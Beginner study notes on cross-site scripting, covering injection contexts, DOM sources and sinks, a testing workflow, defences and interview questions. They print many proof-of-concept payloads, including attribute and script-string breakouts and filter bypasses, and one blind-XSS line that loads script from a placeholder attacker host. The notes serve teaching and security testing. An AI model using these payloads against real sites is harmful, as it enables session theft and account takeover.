Cross-Site Scripting (XSS) 
Foundations, Core Theory, Understanding & Basics Deep Dive
________________________________________
1. What is XSS?
XSS stands for:
Cross-Site Scripting
It is a vulnerability where attacker injects JavaScript into a web application.
That JavaScript executes inside victim’s browser.
________________________________________
2. MOST IMPORTANT UNDERSTANDING
XSS is NOT about attacking server directly.
It is about:
Attacking users through trusted website.
VERY IMPORTANT.
________________________________________
3. Simple Definition
Application displays attacker-controlled input without proper sanitization.
Browser interprets it as code.
________________________________________
4. Core Idea Behind XSS
Websites take user input.
Examples:
•	comments 
•	search box 
•	username 
•	profile bio 
•	messages 
If website displays that input UNSAFELY:
Browser may execute attacker JavaScript.
________________________________________
5. MOST IMPORTANT CONCEPT
Browser does NOT know:
•	developer code 
•	attacker code 
Browser only sees:
<script>...</script>
and executes it.
________________________________________
6. Real-Life Analogy
Imagine:
Website says:
"You can write text on wall."
Attacker instead writes:
<script>stealCookies()</script>
Everyone viewing wall executes attacker script.
That is XSS.
________________________________________
7. Why XSS Happens
Root cause:
Application trusts user input.
And displays it directly into HTML page.
________________________________________
8. Basic Vulnerable Example
________________________________________
Backend
echo $_GET['name'];
________________________________________
URL
https://site.com/?name=anju
Page shows:
Anju
________________________________________
Attacker Sends
<script>alert(1)</script>
________________________________________
Browser Executes
alert(1)
XSS successful.
________________________________________
9. Why "alert(1)" Used?
VERY IMPORTANT beginner concept.
Used because:
•	simple 
•	visible 
•	harmless proof of execution 
It confirms:
JavaScript execution achieved.
________________________________________
10. XSS is Client-Side Vulnerability
VERY IMPORTANT.
Execution happens:
•	inside victim browser 
•	NOT on server 
________________________________________
Flow
Attacker input
      ↓
Website stores/displays it
      ↓
Victim loads page
      ↓
Browser executes JavaScript
________________________________________
11. What Can XSS Do?
VERY IMPORTANT.
________________________________________
Impacts
Impact	Description
Cookie theft	Session hijacking
Account takeover	Login bypass via stolen session
Keylogging	Capture passwords
Fake login forms	Credential phishing
Redirects	Malicious websites
DOM manipulation	Modify page
Browser exploitation	Advanced attacks
________________________________________
12. MOST IMPORTANT THING TO UNDERSTAND
XSS runs with:
Victim user's permissions/session.
NOT attacker permissions.
________________________________________
Example
If admin visits malicious XSS:
•	attacker may hijack admin account 
VERY dangerous.
________________________________________
13. Why XSS is So Dangerous?
Because browser TRUSTS website.
If JavaScript comes from trusted domain:
•	browser allows execution 
________________________________________
14. Same-Origin Policy (SOP)
VERY IMPORTANT theory concept.
________________________________________
SOP Means
JavaScript from:
site.com
can access:
•	cookies 
•	DOM 
•	session 
•	localStorage 
for:
site.com
________________________________________
XSS abuses this trust.
________________________________________
15. What XSS Can Access?
Depends on protections.
________________________________________
Common Targets
Target	Why Valuable
document.cookie	Session cookies
localStorage	JWT tokens
CSRF tokens	Request forgery
DOM data	Sensitive info
User actions	Session abuse
________________________________________
Example
alert(document.cookie)
________________________________________
16. XSS Payload Basics
VERY IMPORTANT.
________________________________________
Basic Payload
<script>alert(1)</script>
________________________________________
Image Payload
<img src=x onerror=alert(1)>
________________________________________
SVG Payload
<svg onload=alert(1)>
________________________________________
Why Multiple Payloads?
Because:
•	filters differ 
•	contexts differ 
•	defenses differ 
________________________________________
17. XSS Requires Context Understanding
MOST IMPORTANT CONCEPT.
Payload depends on WHERE input appears.
________________________________________
Possible Contexts
Context	Example
HTML body	Inside page
Attribute	value=""
JavaScript	inside script
URL	href=""
CSS	style blocks
________________________________________
Example
Input inside:
<div>USER_INPUT</div>
is different from:
<input value="USER_INPUT">
Context matters EVERYTHING in XSS.
________________________________________
18. Reflection Concept
VERY IMPORTANT.
Application takes input:
?q=test
and reflects it back into page.
If unsafe:
•	XSS possible 
________________________________________
Example
You searched: test
Attacker input:
<script>alert(1)</script>
becomes:
You searched: <script>alert(1)</script>
________________________________________
19. Basic XSS Discovery Mindset
NEVER randomly spam payloads first.
Ask:
Where is my input reflected?
MOST IMPORTANT beginner skill.
________________________________________
20. Manual Testing Methodology
VERY IMPORTANT.
________________________________________
Step 1 — Find Input Points
Look for:
•	search boxes 
•	comments 
•	profile fields 
•	feedback forms 
•	URLs 
•	chat systems 
________________________________________
Step 2 — Insert Unique String
Example:
anju123test
________________________________________
Step 3 — Search Response
Check:
•	where input appears 
•	HTML structure 
•	context 
Use:
•	View Source 
•	Burp Suite 
•	DevTools 
________________________________________
Step 4 — Test Simple Payload
<script>alert(1)</script>
________________________________________
Step 5 — Analyze Behavior
Did:
•	execute? 
•	encode? 
•	sanitize? 
•	break HTML? 
________________________________________
21. Understanding Encoding
VERY IMPORTANT.
Secure apps encode dangerous characters.
________________________________________
Example
Input:
<script>
becomes:
&lt;script&gt;
Browser treats it as text.
NOT code.
________________________________________
22. Sanitization vs Encoding
VERY IMPORTANT interview concept.
________________________________________
Protection	Purpose
Encoding	Converts dangerous chars
Sanitization	Removes dangerous content
________________________________________
Example Encoding
< →  &lt;
________________________________________
Example Sanitization
<script>alert(1)</script>
removed entirely.
________________________________________
23. Why Filters Fail
Developers block:
<script>
but attacker uses:
•	img 
•	svg 
•	events 
•	encoding 
•	different contexts 
________________________________________
Example
<img src=x onerror=alert(1)>
No script tag needed.
________________________________________
24. HTML Injection vs XSS
IMPORTANT DIFFERENCE.
________________________________________
HTML Injection	XSS
Inject HTML	Execute JS
Visual impact	Script execution
________________________________________
Example HTML Injection
<b>Hello</b>
________________________________________
Example XSS
<script>alert(1)</script>
________________________________________
25. Stored vs Reflected vs DOM XSS
We will study deeply later.
Quick intro:
Type	Description
Reflected	Immediate reflection
Stored	Saved in DB/server
DOM	Client-side JS issue
________________________________________
26. Why Stored XSS Dangerous?
Because:
•	executes automatically 
•	affects many users 
•	persists 
________________________________________
Example
Attacker posts comment:
<script>alert(1)</script>
Every visitor executes it.
________________________________________
27. Why DOM XSS Special?
Because vulnerability exists:
•	in browser JavaScript 
•	NOT necessarily server response 
Very important advanced topic later.
________________________________________
28. Common Dangerous Sinks
VERY IMPORTANT.
Sink = place where data inserted dangerously.
________________________________________
JavaScript Sinks
innerHTML
document.write
eval
________________________________________
Example
element.innerHTML = userInput;
Dangerous.
________________________________________
29. Sources and Sinks
VERY IMPORTANT INTERVIEW CONCEPT.
________________________________________
Source
Where attacker input comes from.
Example:
location.search
________________________________________
Sink
Where dangerous execution happens.
Example:
innerHTML
________________________________________
DOM XSS often:
Source → Sink
________________________________________
30. Common Event Handlers
VERY important.
________________________________________
Examples
onerror
onload
onclick
onmouseover
________________________________________
Example Payload
<img src=x onerror=alert(1)>
________________________________________
31. Why Input Reflection Alone NOT Enough
IMPORTANT.
Sometimes input reflected safely.
Example:
&lt;script&gt;
No execution.
Need:
•	executable context 
•	unsafe rendering 
________________________________________
32. XSS Discovery Flow
VERY IMPORTANT.
________________________________________
Flow
Find input
    ↓
Check reflection
    ↓
Identify context
    ↓
Test payload
    ↓
Analyze execution
    ↓
Try bypasses
________________________________________
33. Browser Developer Tools in XSS
VERY useful.
Use:
•	Inspect Element 
•	Console 
•	Network tab 
•	Sources tab 
________________________________________
Useful For
•	understanding DOM 
•	viewing reflection 
•	analyzing execution 
________________________________________
34. Burp Suite in XSS
MOST IMPORTANT TOOL.
Use for:
•	intercepting requests 
•	modifying parameters 
•	analyzing responses 
•	repeater testing 
________________________________________
35. Common Beginner Mistakes
________________________________________
Mistake 1
Only testing <script>alert(1)</script>
________________________________________
Mistake 2
Ignoring context
________________________________________
Mistake 3
Not checking source code
________________________________________
Mistake 4
Confusing HTML injection with XSS
________________________________________
36. Real-World Attack Examples
Scenario	Result
Admin visits malicious comment	Admin takeover
Stolen JWT token	Session hijack
Fake login form	Credential theft
Malicious JS loader	Malware delivery
________________________________________
37. Important Security Protections
Quick intro.
We will study deeply later.
________________________________________
Protections
Protection	Purpose
Output encoding	Prevent execution
CSP	Restrict scripts
HttpOnly cookies	Protect cookies
Sanitization	Remove dangerous input
Safe DOM APIs	Prevent DOM XSS
________________________________________
38. HttpOnly Cookies
VERY IMPORTANT.
If cookie has:
HttpOnly
JavaScript cannot read:
document.cookie
Helps reduce impact.
________________________________________
39. CSP (Content Security Policy)
VERY important modern defense.
Restricts:
•	inline JS 
•	external scripts 
•	dangerous sources 
Can reduce XSS impact.
________________________________________
40. Pentester Mindset
Never think:
"Does my payload work?"
First think:
"How is my input rendered?"
That is REAL XSS mindset.
________________________________________
41. Interview Questions (IMPORTANT)
________________________________________
Q1 — What is XSS?
XSS is a client-side vulnerability where attacker injects malicious JavaScript into trusted web application pages executed in victim browser.
________________________________________
Q2 — Why dangerous?
Because attacker may:
•	steal sessions 
•	hijack accounts 
•	manipulate pages 
•	perform actions as victim 
________________________________________
Q3 — Main XSS types?
Type	Description
Reflected	Immediate reflection
Stored	Persisted on server
DOM	Client-side JS issue
________________________________________
Q4 — Difference between encoding and sanitization?
Encoding	Sanitization
Converts dangerous chars	Removes dangerous input
________________________________________
Q5 — What is a sink?
Dangerous location where attacker input gets executed/rendered.
Example:
innerHTML
________________________________________
42. Quick Cheat Sheet
________________________________________
Basic Payload
<script>alert(1)</script>
________________________________________
Event Payload
<img src=x onerror=alert(1)>
________________________________________
SVG Payload
 
________________________________________
Common Sources
location.search
document.URL
document.referrer
________________________________________
Common Sinks
innerHTML
document.write
eval
________________________________________
Main Impacts
Cookie theft
Session hijacking
Account takeover
Phishing
DOM manipulation
________________________________________
MOST IMPORTANT RULE
XSS is all about CONTEXT.

Cross-Site Scripting (XSS) — Part 2
Practical Understanding, Contexts, Payloads & Real Testing
________________________________________
1. MOST IMPORTANT THING BEFORE PRACTICAL XSS
Real XSS is NOT:
"Paste random payload and hope."
Real XSS is:
Understanding how input is rendered.
That is REAL pentester mindset.
________________________________________
2. Real XSS Discovery Flow
VERY IMPORTANT.
Find input
   ↓
Find reflection
   ↓
Identify context
   ↓
Break out of context
   ↓
Execute JavaScript
________________________________________
3. Step 1 — Find Input Points
Look for:
•	search bars 
•	comments 
•	profile fields 
•	chat systems 
•	feedback forms 
•	URL parameters 
•	headers 
•	JSON values 
________________________________________
Example
/search?q=test
________________________________________
4. Step 2 — Check Reflection
Insert unique string.
Example:
anju123xsstest
________________________________________
Then Search Response
Use:
•	Burp Suite 
•	View Source 
•	DevTools 
________________________________________
Goal
Find:
•	where input appears 
•	how it appears 
•	which context 
________________________________________
5. MOST IMPORTANT XSS SKILL
Identify CONTEXT.
________________________________________
Example Contexts
Context	Example
HTML	<div>INPUT</div>
Attribute	value="INPUT"
JavaScript	var x='INPUT'
URL	href="INPUT"
CSS	style="INPUT"
________________________________________
Payload depends completely on context.
________________________________________
6. HTML Context XSS
VERY common beginner case.
________________________________________
Vulnerable Example
<div>USER_INPUT</div>
________________________________________
Attacker Input
<script>alert(1)</script>
________________________________________
Final Output
<div><script>alert(1)</script></div>
Browser executes script.
________________________________________
7. Attribute Context XSS
VERY IMPORTANT.
________________________________________
Vulnerable Example
<input value="USER_INPUT">
________________________________________
Goal
Break out of attribute.
________________________________________
Payload
" autofocus onfocus=alert(1) x="
________________________________________
Final Output
<input value="" autofocus onfocus=alert(1) x="">
XSS achieved.
________________________________________
8. Why Did This Work?
VERY IMPORTANT.
Payload:
•	closed existing quote 
•	added new HTML attribute 
•	injected JS event 
________________________________________
9. Common Event Handlers
VERY IMPORTANT.
________________________________________
Examples
onerror
onload
onclick
onmouseover
onfocus
________________________________________
Example
<img src=x onerror=alert(1)>
If image fails:
•	onerror executes 
________________________________________
10. JavaScript Context XSS
MORE IMPORTANT.
________________________________________
Vulnerable Example
<script>
var name = 'USER_INPUT';
</script>
________________________________________
Goal
Escape JavaScript string.
________________________________________
Payload
';alert(1);//
________________________________________
Final Output
var name='';alert(1);//';
JavaScript executes.
________________________________________
11. MOST IMPORTANT XSS THEORY
XSS is often:
Breaking syntax correctly.
NOT just inserting script tags.
________________________________________
12. URL Context XSS
________________________________________
Vulnerable Example
<a href="USER_INPUT">
________________________________________
Payload
javascript:alert(1)
________________________________________
Final Output
<a href="javascript:alert(1)">
Click triggers JS.
________________________________________
13. DOM-Based XSS Intro
VERY IMPORTANT.
________________________________________
Vulnerable JavaScript
document.body.innerHTML = location.hash;
________________________________________
URL
#<img src=x onerror=alert(1)>
________________________________________
Browser Executes
Payload inserted into DOM.
________________________________________
Important Difference
DOM XSS may happen:
•	completely client-side 
•	without server reflection 
________________________________________
14. Most Important DOM Sources
VERY IMPORTANT.
________________________________________
Sources
location.search
location.hash
document.URL
document.referrer
________________________________________
15. Dangerous DOM Sinks
VERY IMPORTANT.
________________________________________
Sinks
innerHTML
document.write
eval
outerHTML
________________________________________
Dangerous Example
element.innerHTML = userInput;
________________________________________
16. Safe vs Unsafe DOM APIs
________________________________________
Safe	Unsafe
textContent	innerHTML
innerText	document.write
________________________________________
Safe Example
element.textContent = userInput;
Displays text safely.
________________________________________
17. Reflected XSS Deep Understanding
VERY IMPORTANT.
________________________________________
Flow
Attacker sends payload
      ↓
Application reflects immediately
      ↓
Victim opens crafted URL
      ↓
JS executes
________________________________________
Example
/search?q=<script>alert(1)</script>
________________________________________
18. Stored XSS Deep Understanding
MORE DANGEROUS.
________________________________________
Flow
Attacker stores payload
      ↓
Server saves payload
      ↓
Victim visits page
      ↓
Payload executes automatically
________________________________________
Common Places
Location	Risk
Comments	Persistent execution
Chat	Multi-user impact
Profile bio	Admin compromise
Support tickets	Staff compromise
________________________________________
19. Why Stored XSS Dangerous?
Because:
•	persistent 
•	affects many users 
•	often targets admins 
________________________________________
20. Blind XSS
VERY IMPORTANT.
Payload executes later:
•	in admin panel 
•	logs 
•	dashboards 
________________________________________
Example
Attacker submits payload:
<script src=https://attacker.com/x.js></script>
Admin later opens page.
Payload executes.
________________________________________
21. XSS Polyglot Idea
Advanced concept.
Payload works in multiple contexts.
________________________________________
Example
"><svg onload=alert(1)>
Useful for bypassing uncertain contexts.
________________________________________
22. HTML Encoding Understanding
VERY IMPORTANT.
________________________________________
Secure App Converts
<script>
into:
&lt;script&gt;
Browser treats it as text.
No execution.
________________________________________
23. Why Some Payloads Fail
VERY important beginner concept.
________________________________________
Reasons
Reason	Example
Encoded	< becomes &lt;
Sanitized	script removed
Wrong context	payload mismatch
CSP	blocks execution
________________________________________
24. XSS Filter Bypass Concept
Developers block:
<script>
Attacker uses:
•	img 
•	svg 
•	events 
•	encoding 
•	JS contexts 
________________________________________
Example
<svg onload=alert(1)>
________________________________________
25. Why Event Handlers Powerful?
Because JavaScript executes automatically.
________________________________________
Examples
onerror
onload
onfocus
onmouseover
________________________________________
Example
<img src=x onerror=alert(1)>
Image fails → JS executes.
________________________________________
26. Manual Testing Methodology
MOST IMPORTANT SECTION.
________________________________________
Step 1 — Find Reflection
Insert:
anju123
________________________________________
Step 2 — Inspect Response
Check:
•	source code 
•	HTML structure 
•	DOM 
________________________________________
Step 3 — Identify Context
Ask:
Where exactly is my input placed?
________________________________________
Step 4 — Break Context
Examples:
•	close quote 
•	close tag 
•	escape JS string 
________________________________________
Step 5 — Trigger JavaScript
Use:
alert(1)
________________________________________
Step 6 — Analyze Filtering
Check:
•	encoding 
•	sanitization 
•	removed characters 
________________________________________
Step 7 — Try Alternative Payloads
If blocked:
•	img 
•	svg 
•	events 
•	JS context payloads 
________________________________________
27. Burp Suite Workflow
VERY IMPORTANT.
________________________________________
Flow
Intercept request
      ↓
Send to Repeater
      ↓
Modify parameter
      ↓
Analyze reflection
      ↓
Test payloads
________________________________________
MOST IMPORTANT TOOL:
Burp Repeater
________________________________________
28. DevTools Workflow
Use:
•	Elements tab 
•	Console 
•	Sources 
________________________________________
Useful For
•	DOM understanding 
•	seeing execution 
•	finding sinks 
________________________________________
29. Basic Payload Progression
GOOD methodology.
________________________________________
Step 1
test123
________________________________________
Step 2
<test>
________________________________________
Step 3
<script>alert(1)</script>
________________________________________
Step 4
<img src=x onerror=alert(1)>
________________________________________
Step 5
Context-specific payloads.
________________________________________
30. Common Beginner Mistakes
________________________________________
Mistake 1
Ignoring context
________________________________________
Mistake 2
Only using script tags
________________________________________
Mistake 3
Not inspecting response source
________________________________________
Mistake 4
Confusing reflection with execution
________________________________________
31. Reflection vs Execution
VERY IMPORTANT.
________________________________________
Reflection
Input appears in page.
________________________________________
Execution
Browser interprets it as JavaScript.
Reflection alone ≠ XSS.
________________________________________
32. XSS in JSON Responses
VERY IMPORTANT MODERN TOPIC.
________________________________________
Example
{"name":"USER_INPUT"}
Usually safe as JSON.
BUT dangerous if inserted later into DOM unsafely.
________________________________________
33. XSS Through innerHTML
VERY IMPORTANT.
________________________________________
Dangerous Code
output.innerHTML = data;
If data attacker-controlled:
•	DOM XSS possible 
________________________________________
Safer Alternative
output.textContent = data;
________________________________________
34. Common Real-World XSS Locations
Location	Type
Search	Reflected
Comments	Stored
Chat	Stored
Admin panel	Blind XSS
URL fragments	DOM XSS
Profile pages	Stored
________________________________________
35. XSS Impact Examples
VERY IMPORTANT.
________________________________________
Cookie Theft
document.cookie
________________________________________
Fake Login Form
Credential phishing.
________________________________________
Session Hijacking
Steal session token.
________________________________________
Keylogging
Capture keystrokes.
________________________________________
Admin Takeover
Stored XSS targeting admins.
________________________________________
36. Modern Browser Protections
Quick intro.
________________________________________
Protections
Protection	Purpose
CSP	Restrict JS
HttpOnly	Protect cookies
SameSite	Reduce CSRF abuse
Encoding	Safe rendering
________________________________________
37. Quick Practical Cheat Sheet
________________________________________
HTML Context
<script>alert(1)</script>
________________________________________
Event Payload
<img src=x onerror=alert(1)>
________________________________________
Attribute Context
" autofocus onfocus=alert(1) x="
________________________________________
JS Context
';alert(1);//
________________________________________
URL Context
javascript:alert(1)
________________________________________
DOM Sources
location.search
location.hash
________________________________________
Dangerous Sinks
innerHTML
eval
document.write
________________________________________
MOST IMPORTANT RULE
Successful XSS depends on understanding CONTEXT and EXECUTION FLOW.

